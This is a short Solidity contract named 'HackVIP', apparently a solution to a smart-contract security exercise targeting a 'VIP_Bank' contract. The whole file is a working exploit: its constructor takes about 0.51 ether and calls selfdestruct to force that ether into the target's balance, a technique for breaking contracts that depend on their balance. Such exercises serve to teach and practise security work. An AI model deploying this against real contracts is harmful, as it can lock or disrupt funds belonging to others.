// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.7;
import "./VIP_Bank.sol";

contract HackVIP {
    // send some value to the payable constructor
    // 0.51 ether
    constructor(address payable _target) payable {
        // upon this contract deployment
        // destruct this contract immediatly after deployment
        // send the value to the _target address (payable)
        selfdestruct(_target);
        
    }
}